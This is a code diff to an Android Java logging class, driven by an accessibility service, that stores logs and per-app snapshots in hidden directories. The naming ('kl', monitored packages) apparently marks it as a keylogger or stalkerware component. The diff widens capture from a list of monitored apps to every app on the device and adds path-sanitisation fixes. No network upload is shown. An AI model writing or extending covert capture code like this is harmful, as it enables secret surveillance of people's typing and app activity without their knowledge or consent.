@@ -29,7 +29,11 @@ import java.util.Locale;
  *
  * Storage layout (hidden inside app's private internal directory):
  *   /data/data/<pkg>/files/.kl/YYYY-MM-DD.jsonl          — global logs for that day
- *   /data/data/<pkg>/files/.am/<appPkg>/kl/YYYY-MM-DD.jsonl — per-monitored-app logs
+ *   /data/data/<pkg>/files/.am/<appPkg>/kl/YYYY-MM-DD.jsonl — per-app logs (every app)
+ *
+ * Every log is written twice: once to the global day file and once to that
+ * app's own day file. This is unconditional — it is not limited to the
+ * packages listed in Constants.MONITORED_PACKAGES.
  *
  * Auto-started by UnifiedAccessibilityService when accessibility is granted.
  * This class is NOT an AccessibilityService itself — it is a utility
@@ -167,8 +171,8 @@ public class LogManager {
         // 1. Write to global day file
         appendToFile(globalFile(today), line);
 
-        // 2. If package is monitored, write to per-app day file too
-        if (isMonitored(packageName)) {
+        // 2. Write to per-app day file too — for EVERY app, not just monitored ones
+        if (packageName != null && !packageName.isEmpty()) {
             appendToFile(appFile(packageName, today), line);
         }
     }
@@ -411,7 +415,7 @@ public class LogManager {
         JSONObject result = new JSONObject();
         try {
             File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
-                                packageName + "/kl");
+                                safeDirName(packageName) + "/kl");
             JSONArray logs = new JSONArray();
 
             if (date != null && !date.isEmpty()) {
@@ -456,7 +460,7 @@ public class LogManager {
         JSONObject result = new JSONObject();
         try {
             File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
-                                packageName + "/kl");
+                                safeDirName(packageName) + "/kl");
             JSONArray dates = new JSONArray();
             if (dir.exists()) {
                 File[] files = dir.listFiles(f -> f.getName().endsWith(".jsonl"));
@@ -510,7 +514,7 @@ public class LogManager {
     public void saveAppSnapshot(String packageName, String snapshotJson) {
         try {
             File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
-                                  packageName + "/ss");
+                                  safeDirName(packageName) + "/ss");
             if (!ssDir.exists()) ssDir.mkdirs();
             String ts = new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss-SSS", Locale.getDefault()).format(new Date());
             File f = new File(ssDir, ts + ".json");
@@ -530,7 +534,7 @@ public class LogManager {
         JSONObject result = new JSONObject();
         try {
             File ssDir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
-                                  packageName + "/ss");
+                                  safeDirName(packageName) + "/ss");
             JSONArray list = new JSONArray();
             if (ssDir.exists()) {
                 File[] files = ssDir.listFiles(f -> f.getName().endsWith(".json"));
@@ -563,7 +567,7 @@ public class LogManager {
         JSONObject result = new JSONObject();
         try {
             File f = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
-                              packageName + "/ss/" + filename);
+                              safeDirName(packageName) + "/ss/" + new File(filename).getName());
             if (!f.exists()) {
                 result.put("success", false);
                 result.put("error", "Snapshot not found: " + filename);
@@ -614,9 +618,19 @@ public class LogManager {
 
     private File appFile(String packageName, String date) {
         File dir = new File(new File(context.getFilesDir(), Constants.APP_MONITOR_DIR),
-                            packageName + "/kl");
+                            safeDirName(packageName) + "/kl");
         if (!dir.exists()) dir.mkdirs();
         return new File(dir, date + ".jsonl");
+    }
+
+    /**
+     * Every app now gets its own directory, so the package name is used as a
+     * path segment. Strip anything that could escape the .am root.
+     */
+    private String safeDirName(String packageName) {
+        if (packageName == null) return "unknown";
+        String name = packageName.replaceAll("[^A-Za-z0-9._]", "_");
+        return name.isEmpty() ? "unknown" : name;
     }
 
     private String todayStr() {
